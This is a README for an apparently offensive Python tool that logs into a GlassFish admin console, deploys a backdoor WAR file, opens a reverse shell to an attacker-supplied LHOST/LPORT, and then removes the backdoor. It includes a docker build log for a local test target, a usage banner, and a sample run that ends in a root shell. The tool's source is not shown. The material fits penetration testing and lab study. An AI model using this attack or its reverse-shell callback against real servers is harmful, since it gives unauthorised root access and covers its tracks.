# glassfish_war_rce

## Summary

Gets code execution on a glassfish instance by upload an backdoor war and remove it after
it created a reverse shell.

## Usage

Start docker container with glassfish if you want to test this locally

```sh
 glassfish_war_rce  master ⦿ docker-compose build
Building glassfish
Step 1/11 : FROM glassfish:latest
 ---> 7d04a1452d00
Step 2/11 : EXPOSE 8080 4848
 ---> Using cache
 ---> ffca24dd41ab
Step 3/11 : ENV GLASSFISH_PATH /usr/local/glassfish4
 ---> Running in 36e33ba3b5cb
Removing intermediate container 36e33ba3b5cb
 ---> ed3dc9d0fcbb
Step 4/11 : ENV ADMIN_USER admin
 ---> Running in 5ddd2a330d31
Removing intermediate container 5ddd2a330d31
 ---> 71f95a9ab344
Step 5/11 : ENV ADMIN_PASSWORD admin
 ---> Running in 6c72630d553f
Removing intermediate container 6c72630d553f
 ---> 219059fd902c
Step 6/11 : RUN echo 'AS_ADMIN_PASSWORD=\nAS_ADMIN_NEWPASSWORD='$ADMIN_PASSWORD'\nEOF\n'>> /opt/tmpfile
 ---> Running in 1cdfca4d4a43
Removing intermediate container 1cdfca4d4a43
 ---> b40d2559a61a
Step 7/11 : RUN echo 'AS_ADMIN_PASSWORD='$ADMIN_PASSWORD'\nEOF\n'>> /opt/pwdfile
 ---> Running in b6a98ace91f1
Removing intermediate container b6a98ace91f1
 ---> f81f83a7f0d7
Step 8/11 : RUN  $GLASSFISH_PATH/bin/asadmin start-domain &&  $GLASSFISH_PATH/bin/asadmin --user $ADMIN_USER --passwordfile=/opt/tmpfile change-admin-password &&  $GLASSFISH_PATH/bin/asadmin --user $ADMIN_USER --passwordfile=/opt/pwdfile enable-secure-admin &&  $GLASSFISH_PATH/bin/asadmin restart-domain
 ---> Running in 01269f81f1f8
Waiting for domain1 to start ...
Successfully started the domain : domain1
domain  Location: /usr/local/glassfish4/glassfish/domains/domain1
Log File: /usr/local/glassfish4/glassfish/domains/domain1/logs/server.log
Admin Port: 4848
Command start-domain executed successfully.
Command change-admin-password executed successfully.
You must restart all running servers for the change in secure admin to take effect.
Command enable-secure-admin executed successfully.
Successfully restarted the domain
Command restart-domain executed successfully.
Removing intermediate container 01269f81f1f8
 ---> 21e1481e3c1e
Step 9/11 : COPY start.sh /
 ---> 96484633f06f
Step 10/11 : RUN rm /opt/tmpfile
 ---> Running in 333bbd395ed4
Removing intermediate container 333bbd395ed4
 ---> a77bb4d58393
Step 11/11 : ENTRYPOINT ["/start.sh"]
 ---> Running in 64b152de687d
Removing intermediate container 64b152de687d
 ---> 3a441622c49f
Successfully built 3a441622c49f
Successfully tagged glassfishwarrce_glassfish:latest

⬢  glassfish_war_rce  master ⦿ docker-compose up -d
Creating glassfishwarrce_glassfish_1 ... done
```

Verify that container is running.

```sh
⬢  glassfish_war_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                       COMMAND             CREATED             STATUS              PORTS               NAMES
4b683e992fa8        glassfishwarrce_glassfish   "/start.sh"         13 seconds ago      Up 13 seconds                           glassfishwarrce_glassfish_1
```

Run ./glassfish_war_rce.py to get the usage menu.

```sh
⬢  glassfish_war_rce  master ⦿ ./glassfish_war_rce.py

 ▄▄ • ▄▄▌   ▄▄▄· .▄▄ · .▄▄ · ·▄▄▄▪  .▄▄ ·  ▄ .▄▄▄▌ ▐ ▄▌ ▄▄▄· ▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
▐█ ▀ ▪██•  ▐█ ▀█ ▐█ ▀. ▐█ ▀. ▐▄▄·██ ▐█ ▀. ██▪▐███· █▌▐█▐█ ▀█ ▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▄█ ▀█▄██▪  ▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄██▪ ▐█·▄▀▀▀█▄██▀▐███▪▐█▐▐▌▄█▀▀█ ▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐█▄▪▐█▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐███▌.▐█▌▐█▄▪▐███▌▐▀▐█▌██▐█▌▐█ ▪▐▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
·▀▀▀▀ .▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀▀▀ · ▀▀▀▀ ▀▪ ▀  ▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀
[mikael.kall@kindredgroup.com]

Usage: ./glassfish_war_rce.py <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>

EXAMPLE: ./glassfish_war_rce.py 'https://127.0.0.1:8080' 10.10.14.24 1337 <USERNAME> <PASSWORD>
```        

Run the exploit.

```sh
⬢  glassfish_war_rce  master ⦿ ./glassfish_war_rce.py 'https://127.0.0.1:8080' 10.100.12.59 1337 admin admin
[+] LHOST = 10.100.12.59
[+] Deploy successful
[+] OS:Linux
[+] Shell listen
[+] Exploit
root@desktop:/usr/local/glassfish4/glassfish/domains/domain1/config# whoami
root
```

This also works on windows but is untested as I do not have a windows machine to test on.